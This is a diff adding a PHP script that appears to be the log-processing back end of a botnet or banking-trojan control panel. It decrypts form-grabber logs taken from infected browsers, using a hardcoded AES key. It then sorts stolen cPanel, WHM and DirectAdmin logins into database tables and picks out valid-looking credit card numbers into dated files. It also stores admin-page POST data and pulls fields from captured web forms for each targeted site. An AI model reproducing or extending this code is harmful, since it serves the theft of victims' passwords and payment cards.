@@ -1,0 +1,405 @@
+<?php
+
+if(!function_exists('generatePassword')){
+	function generatePassword ($length = 8){
+		$password = '';
+		$possible = "0123456789aAbBcCdDfFgGhHjJkKmMnNpPqQrRsStTvVwWxXyYzZ";
+		$i = 0;
+		while ($i < $length){
+			$char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
+			if (!strstr($password, $char)) {
+				$password .= $char;
+				$i++;
+			}
+		}
+		$password = str_replace('BJB', 'JBJ', $password);
+		return $password;
+	}
+}
+
+/*
+function rc_encode($str, $key = ''){
+	global $rc, $no_base64;
+	//$str = urldecode($str);
+	if(empty($str)) return '';
+	if(empty($key)) $key = $rc['key'];
+    if(!isset($no_base64)) $no_base64 = false;
+	$iv = generatePassword(8);
+	$data = openssl_encrypt($str, 'RC2-CBC', $key, $no_base64, $iv);
+	if(strpos($data, '==') !== false){
+		return substr($iv, 0, 4) . substr($data, 0, strlen($data)-2) . substr($iv, 4, 8) . '==';
+	}elseif(strpos($data, '=') !== false){
+		return substr($iv, 0, 4) . substr($data, 0, strlen($data)-1) . substr($iv, 4, 8) . '=';
+	}else{
+		return substr($iv, 0, 4) . $data . substr($iv, 4, 8);
+	}
+}
+
+function rc_decode($str, $key = ''){
+	global $rc, $no_base64;
+	$str = urldecode($str);
+	if(empty($str)) return '';
+	if(empty($key)) $key = $rc['key'];
+	if(!isset($no_base64)) $no_base64 = false;
+	$str = str_replace(' ', '+', $str);
+	if(strpos($str, '==') !== false){
+		$iv = substr($str, 0, 4) . str_replace('==', '', substr($str, strlen($str)-6, strlen($str)-4));
+		return openssl_decrypt(substr($str, 4, strlen($str)-10) . '==', 'RC2-CBC', $key, $no_base64, $iv);
+	}elseif(strpos($str, '=') !== false){
+		$iv = substr($str, 0, 4) . str_replace('=', '', substr($str, strlen($str)-5, strlen($str)-3));
+		return openssl_decrypt(substr($str, 4, strlen($str)-9) . '=', 'RC2-CBC', $key, $no_base64, $iv);
+	}else{
+		$iv = substr($str, 0, 4) . substr($str, strlen($str)-4, strlen($str));
+		return openssl_decrypt(substr($str, 4, strlen($str)-8), 'RC2-CBC', $key, $no_base64, $iv);
+	}
+}
+*/
+
+if(!function_exists('rc_encode_aes')){
+	function rc_encode_aes($str, $key = ''){
+		global $rc;
+		if(empty($key)) $key = $rc['key'];
+		$iv = generatePassword(16);
+		$data = openssl_encrypt($str, 'AES-256-CBC', $key, false, $iv);
+		if(strpos($data, '==') !== false){
+			return substr($iv, 0, 8) . substr($data, 0, strlen($data)-2) . substr($iv, 8, 16) . '==';
+		}elseif(strpos($data, '=') !== false){
+			return substr($iv, 0, 8) . substr($data, 0, strlen($data)-1) . substr($iv, 8, 16) . '=';
+		}else{
+			return substr($iv, 0, 8) . $data . substr($iv, 8, 16);
+		}
+	}
+}
+
+if(!function_exists('rc_decode_aes')){
+	function rc_decode_aes($str, $key = ''){
+		global $rc;
+		if(empty($key)) $key = $rc['key'];
+		$str = str_replace(' ', '+', $str);
+		if(strpos($str, '==') !== false){
+			$iv = substr($str, 0, 8) . str_replace('==', '', substr($str, strlen($str)-10, strlen($str)-8));
+			return openssl_decrypt(substr($str, 8, strlen($str)-18) . '==', 'AES-256-CBC', $key, false, $iv);
+		}elseif(strpos($str, '=') !== false){
+			$iv = substr($str, 0, 8) . str_replace('=', '', substr($str, strlen($str)-9, strlen($str)-7));
+			return openssl_decrypt(substr($str, 8, strlen($str)-17), 'AES-256-CBC', $key, false, $iv);
+		}else{
+			//$iv = substr($str, 0, 8) . substr($str, strlen($str)-8, strlen($str)-6);
+			$iv = substr($str, 0, 8) . substr($str, strlen($str)-8, strlen($str));
+			return openssl_decrypt(substr($str, 8, strlen($str)-16), 'AES-256-CBC', $key, false, $iv);
+		}
+	}
+}
+
+$log = explode('[~]', $log);
+
+$var = array();
+
+if(isset($log[0])){
+	//$mysqli->query('update bf_threads set cv = \''.$abp.'\', pv = \''.$cbp.'\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
+	//$mysqli->query("INSERT DELAYED INTO bf_threads (id, pid, file, type, size, sizep, cv, pv, unnecessary, status, post_id, script, last_date, post_date post_date) VALUES ('".$thread->id."', '".$thread->pid."', '".$thread->file."', '".$thread->type."', '".$thread->size."', '".$thread->sizep."', '".$abp."', '".$cbp."', '".$thread->unnecessary."', '".$thread->status."', '".$thread->post_id."', '".$thread->script."', CURRENT_TIMESTAMP, '".$thread->post_date."') ON DUPLICATE KEY UPDATE cv='".$abp."', pv = '".$cbp."', last_date = CURRENT_TIMESTAMP");
+	foreach($log as $item){
+		$var[0] = explode('[,]', $item);
+		
+		if(count($var[0]) >= 5){
+			if(preg_match('~gz\.txt$~is', $thread->file)){
+				if(strpos($var[0][4], 'LOG:') === 0){
+					$rc_key = 'TnqbwNDcXdYFEw1Bh3j1ba2yC305aRAP';
+					$var[0][4] = str_replace('LOG:', '', $var[0][4]);
+					$var[0][4] = @rc_decode_aes(@gzinflate($var[0][4]), $rc_key);
+
+					if(empty($var[0][4])){
+					    error_log('EMPTY_AES: ' . print_r($var[0], true),4);
+					    //print_r($var[0]);
+					    //exit;
+					}
+				}else{
+					$var[0][4] = @gzinflate($var[0][4]);
+				}
+			}else{
+				if(base64_decode($var[0][4]) != false){
+					$var[0][4] = @base64_decode($var[0][4]);
+				}
+			}
+			
+			if(strlen($var[0][4]) > 10240) continue;
+			
+			$var[0][4] = explode('|POST:', $var[0][4], 2);
+			
+			if(empty($var[0][4][0])) continue; // ссылка
+			if(empty($var[0][4][1])) continue; // пост данные
+			
+			$var[0][4][0] = trim($var[0][4][0], "\r\n");
+			$var[0][4][1] = trim($var[0][4][1], "\r\n");
+			
+			if(stripos($var[0][4][0], 'http://') === 0){
+				$var[0]['host'] = get_host($var[0][4][0]);
+				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
+			}elseif(stripos($var[0][4][0], 'https://') === 0){
+				$var[0]['host'] = get_host($var[0][4][0]);
+				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
+			}elseif(stripos($var[0][4][0], 'site://') === 0){
+				$var[0][4][0] = str_replace('site://', 'http://', $var[0][4][0]);
+				$var[0]['host'] = get_host($var[0][4][0]);
+				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', $var[0][4][0]), PHP_URL_PORT);
+			}else{
+				$var[0]['host'] = get_host($var[0][4][0]);
+				$var[0]['port'] = @parse_url(str_replace(' (cPanel)', '', 'http://' . $var[0][4][0]), PHP_URL_PORT);
+			}
+			
+			if(empty($var[0]['host'])) continue;
+			
+			if($var[0][3] == '1'){				$var[0]['b'] = 'InternetExplorer';
+			}elseif($var[0][3] == '2'){
+				$var[0]['b'] = 'MozillaFirefox';
+			}elseif($var[0][3] == '3'){
+				$var[0]['b'] = 'Opera';
+			}else{				$var[0]['b'] = 'Unknow';
+			}
+
+			if($geoip_ex != true){				$var[0]['country'] = geoip_country_code_by_name($var[0][2]);
+			}else{				if(file_exists($dir['site'] . '/cache/geoip/')) $var[0]['country'] = geoip_country_code_by_addr($gi, $var[0][2]);
+			}
+			if(empty($var[0]['country'])) $var[0]['country'] = 'UNK';
+
+			$import = false;
+
+			if(!empty($thread->post_id) && !file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_panels')){
+				if(strpos($var[0][4][0], '/manager/ispmgr') != false){					//file_put_contents('panel_ispmgr', print_r($var[0], true) . "\r\n", FILE_APPEND);
+				}else{
+					if(!empty($var[0]['port'])){
+						switch($var[0]['port']){
+							case '2082':
+							case '2083':
+								//@parse_str($var[0][4][1], $vdata);
+								@mb_parse_str($var[0][4][1], $vdata);
+								if(!empty($vdata['user']) && !empty($vdata['pass'])){
+									$mysqli->query('INSERT DELAYED INTO bf_filter_panels (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES (\''.$var[0][0].'\', \''.$var[0][1].'\', \''.$var[0]['country'].'\', \''.md5('http://'.$var[0]['host'].':'.$var[0]['port'].'/'.$vdata['user'].$vdata['pass']).'\', \'cPanel\', \'1\', NOW(), \'http://'.$var[0]['host'].':'.$var[0]['port'].'/\', \''.$vdata['user'].'\', \''.$vdata['pass'].'\')');
+								}
+							break;
+							
+							case '2086':
+							case '2087':
+								@mb_parse_str($var[0][4][1], $vdata);
+								if(!empty($vdata['user']) && !empty($vdata['pass'])){
+									$mysqli->query('INSERT DELAYED INTO bf_filter_panels (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES (\''.$var[0][0].'\', \''.$var[0][1].'\', \''.$var[0]['country'].'\', \''.md5('http://'.$var[0]['host'].':'.$var[0]['port'].'/'.$vdata['user'].$vdata['pass']).'\', \'WHM\', \'1\', NOW(), \'http://'.$var[0]['host'].':'.$var[0]['port'].'/\', \''.$vdata['user'].'\', \''.$vdata['pass'].'\')');
+								}
+							break;
+	    
+							case '2222':
+								@mb_parse_str($var[0][4][1], $vdata);
+								if(!empty($vdata['username']) && !empty($vdata['password'])){
+								    $vdata = explode(':', $ld[1]);
+								    $mysqli->query('INSERT DELAYED INTO bf_filter_panels (prefix, uid, country, md5_hash, program, type, post_date, v1, v2, v3) VALUES (\''.$var[0][0].'\', \''.$var[0][1].'\', \''.$var[0]['country'].'\', \''.md5($ld[0].$vdata['username'].$vdata['password']).'\', \'DirectAdmin\', \'3\', NOW(), \''.$var[0][4][0].'/\', \''.$vdata['username'].'\', \''.$vdata['password'].'\')');
+								}
+							break;
+						
+							case '8080':
+								$import = true;
+							break;
+						
+							default:
+								//file_put_contents('panel_unknow', print_r($var[0], true) . "\r\n", FILE_APPEND);
+								$import = true;
+							break;
+						}
+					}else{
+						$import = true;
+					}
+				}
+			}
+			
+			if(strpos($var[0][4][0], '/adm') != false){
+				@file_put_contents($dir['site'] . '/cache/admin/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
+				if(!isset($filters[$var[0]['host']]) && $filters[$var[0]['host']]['save_log'] != '1') $import = false;
+			}
+			
+			if(strpos($var[0][4][0], '=admin') != false){
+				@file_put_contents($dir['site'] . '/cache/admin/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
+				if(!isset($filters[$var[0]['host']]) && $filters[$var[0]['host']]['save_log'] != '1') $import = false;
+			}
+			
+			if($import === true){
+				$var[0]['host_pre'] = mb_substr($var[0]['host'], 0, 2, 'utf8');
+				if(!preg_match('~^([a-zA-Z0-9]+)$~', $var[0]['host_pre'])) $var[0]['host_pre'] = 'none';
+				
+				if(isset($var[0][5]) && $var[0][5] == 1){
+					@file_put_contents($dir['site'] . '/cache/cc/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
+				}else{
+					preg_match_all('/(?:[0-9]{16}|[0-9]{13}|[0-9]{4}(?:\s[0-9]{4}){3})/is', $var[0][4][1], $matches, PREG_PATTERN_ORDER);
+					if(count($matches[0]) > 0){
+						$ccccvalid = false;
+						foreach($matches[0] as $itemse){
+							if($ccccvalid != true){
+								$ccccvalid = checkccvalid($itemse);
+								break;
+							}
+						}
+						
+						if($ccccvalid != false){
+							@file_put_contents($dir['site'] . '/cache/cc/' . date('d.m.Y') . '.txt', '<ID: '.$var[0][0].$var[0][1].' BROWSER: '.$var[0]['b'].' IP: '.$var[0][2].' ('.$var[0]['country'].')>' . "\r\n" . 'URL:' . "\r\n" . $var[0][4][0] . "\r\n" . 'POST:' . "\r\n" . str_replace('&', "\r\n", $var[0][4][1]) . "\r\n" . '#END#' . "\r\n\r\n", FILE_APPEND);
+						}
+						unset($ccccvalid);
+					}
+					unset($matches);
+				}
+
+				if(isset($filters[$var[0]['host']]) && $filters[$var[0]['host']]['save_log'] == '1'){					$var[0]['host_md5'] = md5($var[0]['host']);
+					$mysqli->query('INSERT DELAYED INTO bf_save_ilog (host, md5, type) VALUES (\''.$var[0]['host'].'\', \''.$var[0]['host_md5'].'\', \''.$thread->type.'\')');
+					//file_put_contents($dir['site'] . 'cache/imports/' . $thread->id . '_save_ilog' . '.txt', "[|]".$var[0]['host']."[|]".$var[0]['host_md5']."[|]".$thread->type."[~]", FILE_APPEND);
+					//file_put_contents($dir['site'] . 'cache/imports/save_ilog.txt', "[|]".$var[0]['host']."[|]".$var[0]['host_md5']."[|]".$thread->type."[~]", FILE_APPEND);
+					file_put_contents($dir['s']['5'] . '/' . $var[0]['host_md5'], $var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] .  "[~]\r\n\r\n", FILE_APPEND);
+				}
+
+				if(isset($filters[$var[0]['host']]) && !empty($filters[$var[0]['host']]['fields']['formgrabber'][1]) && !file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_' . $filters[$var[0]['host']]['id'])){
+					$var[1] = count($filters[$var[0]['host']]['fields']['name']);
+					if($var[1] > 0){
+						$var[4] = '';
+						$var[5] = '';
+						$var[6] = '';
+						$false = false;
+						
+						for($i = 0; $i < $var[1]; $i++){
+							if(!empty($filters[$var[0]['host']]['fields']['formgrabber'][$i+1])){
+								@mb_parse_str($var[0][4][1], $output);
+								$output = array_change_key_case_unicode($output, CASE_LOWER);
+								$var[2] = '';
+								
+								if(strpos($filters[$var[0]['host']]['fields']['formgrabber'][$i+1], ',') != false){
+									$var[3] = explode(',', $filters[$var[0]['host']]['fields']['formgrabber'][$i+1]);
+									if(count($var[3]) > 0){
+										foreach($var[3] as $data){
+											//$data = strtolower($data);
+											$data = mb_strtolower($data, 'UTF-8');
+											if(strpos($data, '^') === 0){
+												$data = str_replace('^', '', $data);
+												foreach($output as $ke => $ou){
+													if(stripos($ke, $data) === 0){
+														$var[2] .= $ou;
+													}
+												}
+											}else{
+												if(isset($output[$data])){
+													$var[2] .= $output[$data];
+												}else{
+													$var[2] .= $data;
+												}
+											}
+										}
+									}
+								}elseif(strpos($filters[$var[0]['host']]['fields']['formgrabber'][$i+1], '|') != false){
+									$var[3] = explode('|', $filters[$var[0]['host']]['fields']['formgrabber'][$i+1]);
+									if(count($var[3]) > 0){
+										foreach($var[3] as $data){
+											//$data = strtolower($data);
+											$data = mb_strtolower($data, 'UTF-8');
+											if(strpos($data, '^') === 0){
+												$data = str_replace('^', '', $data);
+												foreach($output as $ke => $ou){
+													if(stripos($ke, $data) === 0){
+														$var[2] = $ou;
+														break 1;
+													}
+												}
+											}else{
+												if(isset($output[$data])) $var[2] = $output[$data];
+											}
+										}
+									}
+								}else{
+									//$data = strtolower($filters[$var[0]['host']]['fields']['formgrabber'][$i+1]);
+									$data = mb_strtolower($filters[$var[0]['host']]['fields']['formgrabber'][$i+1], 'UTF-8');
+									if(strpos($data, '^') === 0){										$data = str_replace('^', '', $data);
+										foreach($output as $ke => $ou){											if(strpos($ke, $data) === 0){												$var[2] = $ou;
+												break 1;
+											}
+										}
+									}else{
+										if(isset($output[mb_strtolower($filters[$var[0]['host']]['fields']['formgrabber'][$i+1], 'UTF-8')])) $var[2] = $output[$data];
+									}
+								}
+								
+								if(!empty($var[2])){
+									$false = true;
+									$var[4] .= $var[2];
+									$var[5] .= "v" . ($i+1) . ",";
+									$var[6] .= "'" . str_replace("'", "\'", $var[2]) . "',";
+								}else{
+									$false = false;
+								}
+							}elseif($false != true){
+								$false = false;
+								break 1;
+							}
+						}
+
+						if($false != false){
+							//$var[5] = rtrim($var[5], '[|]');
+							if(!isset($thread->var[$filters[$var[0]['host']]['id']])) $thread->var[$filters[$var[0]['host']]['id']] = rtrim($var[5], ',');
+							$var[6] = rtrim($var[6], ',');
+							
+							/*
+							 if(strlen($var[6]) > 1024){
+								file_put_contents($dir['site'] . 'cache/imports/' . $filters[$var[0]['host']]['id'] . '.ptp',  print_r($var, true) . "\r\n\r\n", FILE_APPEND);
+							 }
+							 */
+							
+							add_item($filters[$var[0]['host']]['id'], $var[0][0], $var[0][1], $var[0]['country'], $var[0]['b'], $var[6]);
+							
+							//$mysqli->query("INSERT DELAYED INTO bf_filter_".$filters[$var[0]['host']]['id']." (prefix, uid, country, md5_hash, program, type, post_date,".$var[5].") VALUES ('".$var[0][0]."', '".$var[0][1]."', '".$var[0]['country']."', '".md5($var[4])."', '".$var[0]['b']."', '".$thread->type."', NOW(), ".$var[6].")");
+							// id, prefix, uid, country, v1, v2, md5_hash, program, type, save, post_date
+							//file_put_contents($dir['site'] . 'cache/imports/' . $thread->id . '_' . $filters[$var[0]['host']]['id'] . '.txt', "[|]".$var[0][0]."[|]".$var[0][1]."[|]".$var[0]['country']."[|]".$var[6]."[|]".md5($var[4])."[|]".$var[0]['b']."[|]".$thread->type."[|][~]", FILE_APPEND);
+							//file_put_contents($dir['site'] . 'cache/imports/' . $filters[$var[0]['host']]['id'] . '.txt', "[|]".$var[0][0]."[|]".$var[0][1]."[|]".$var[0]['country']."[|]".$var[6]."[|]".md5($var[4])."[|]".$var[0]['b']."[|]".$thread->type."[|][~]", FILE_APPEND);
+						}else{
+							/*
+							if(empty($unnecessary_uniq[$var[0]['host']])){
+							if(!file_exists($dir['u']['5'] . $var[0]['host_pre'] . '/')) @mkdir($dir['u']['5'] . $var[0]['host_pre'] . '/');
+								$unnecessary_uniq[$var[0]['host']] = md5($var[0]['host']);
+								$mysqli->query('INSERT DELAYED INTO bf_unnecessary (host, md5, type) VALUES (\''.$var[0]['host'].'\', \''.$unnecessary_uniq[$var[0]['host']].'\', \''.$thread->type.'\')');
+								//file_put_contents($dir['site'] . 'cache/imports/' . $thread->id . '_unnecessary' . '.txt', "''[|]".$var[0]['host']."[|]".$unnecessary_uniq[$var[0]['host']]."[|]".$thread->type."[~]", FILE_APPEND);
+								//file_put_contents($dir['site'] . 'cache/imports/unnecessary.txt', "''[|]".$var[0]['host']."[|]".$unnecessary_uniq[$var[0]['host']]."[|]".$thread->type."[~]", FILE_APPEND);
+							}
+							file_put_contents($dir['u']['5'] . $var[0]['host_pre'] . '/' . $unnecessary_uniq[$var[0]['host']], $var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] .  "[~]\r\n\r\n", FILE_APPEND);
+							*/
+							/*
+							if(!file_exists($dir['site'] . 'cache/unnecessary/' . $var[0]['host_pre'])){								$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$var[0]['host_pre'].' LIKE adm_unnecessary.bf_unnecessary');
+								file_put_contents($dir['site'] . 'cache/unnecessary/' . $var[0]['host_pre'], true);
+							}
+							*/
+							//add_un($var[0]['host'], $var[0]['host_pre'], gzdeflate($var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] .  "[~]\r\n\r\n"));
+							//$mysqli->query("INSERT DELAYED INTO adm_unnecessary.bf_".$var[0]['host_pre']." (host, type, data) VALUES ('".$var[0]['host']."', '5', '".$mysqli->real_escape_string(gzdeflate($var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] .  "[~]\r\n\r\n"))."')");
+						}
+					}
+				}else{					if(!empty($var[0]['host']) && !file_exists($dir['site'] . 'cache/fdi/' . $thread->post_id . '_' . $filters[$var[0]['host']]['id'])){
+						/*
+						if(empty($unnecessary_uniq[$var[0]['host']])){
+							if(!file_exists($dir['u']['5'] . $var[0]['host_pre'] . '/')) @mkdir($dir['u']['5'] . $var[0]['host_pre'] . '/');
+							$unnecessary_uniq[$var[0]['host']] = md5($var[0]['host']);
+							$mysqli->query('INSERT DELAYED INTO bf_unnecessary (host, md5, type) VALUES (\''.$var[0]['host'].'\', \''.$unnecessary_uniq[$var[0]['host']].'\', \''.$thread->type.'\')');
+							//file_put_contents($dir['site'] . 'cache/imports/' . $thread->id . '_unnecessary' . '.txt', "''[|]".$var[0]['host']."[|]".$unnecessary_uniq[$var[0]['host']]."[|]".$thread->type."[~]", FILE_APPEND);
+							//file_put_contents($dir['site'] . 'cache/imports/unnecessary.txt', "''[|]".$var[0]['host']."[|]".$unnecessary_uniq[$var[0]['host']]."[|]".$thread->type."[~]", FILE_APPEND);
+						}
+						file_put_contents($dir['u']['5'] . $var[0]['host_pre'] . '/' . $unnecessary_uniq[$var[0]['host']], $var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] . "[~]\r\n\r\n", FILE_APPEND);
+						*/
+						if(!file_exists($dir['site'] . 'cache/unnecessary/' . $var[0]['host_pre'])){							$mysqli->query('CREATE TABLE IF NOT EXISTS adm_unnecessary.bf_'.$var[0]['host_pre'].' LIKE adm_unnecessary.bf_unnecessary');
+							file_put_contents($dir['site'] . 'cache/unnecessary/' . $var[0]['host_pre'], true);
+						}
+						add_un($var[0]['host'], $var[0]['host_pre'], gzdeflate($var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] .  "[~]\r\n\r\n"));
+						//$mysqli->query("INSERT DELAYED INTO adm_unnecessary.bf_".$var[0]['host_pre']." (host, type, data) VALUES ('".$var[0]['host']."', '5', '".$mysqli->real_escape_string(gzdeflate($var[0][0] . "[,]\r\n" . $var[0][1] . "[,]\r\n" . $var[0][2] . "[,]\r\n" . $var[0][3] . "[,]\r\n" . $var[0][4][0] . '|POST:' . $var[0][4][1] .  "[~]\r\n\r\n"))."')");
+					}
+				}
+			}
+		}
+		
+		/*
+		 $cbp++;
+		$tipe = time();
+		if(($tize+30) < $tipe){
+			$mysqli->query('update bf_threads set cv = \''.$abp.'\', pv = \''.$cbp.'\', last_date = CURRENT_TIMESTAMP WHERE (id = \''.$thread->id.'\')');
+			$tize = $tipe;
+			//$mysqli->query("INSERT DELAYED INTO bf_threads (id, pid, file, type, size, sizep, cv, pv, unnecessary, status, post_id, script, last_date, post_date post_date) VALUES ('".$thread->id."', '".$thread->pid."', '".$thread->file."', '".$thread->type."', '".$thread->size."', '".$thread->sizep."', '".$abp."', '".$cbp."', '".$thread->unnecessary."', '".$thread->status."', '".$thread->post_id."', '".$thread->script."', CURRENT_TIMESTAMP, '".$thread->post_date."') ON DUPLICATE KEY UPDATE cv='".$abp."', pv = '".$cbp."', last_date = CURRENT_TIMESTAMP");
+		}
+		*/
+	}
+}
+
+?>
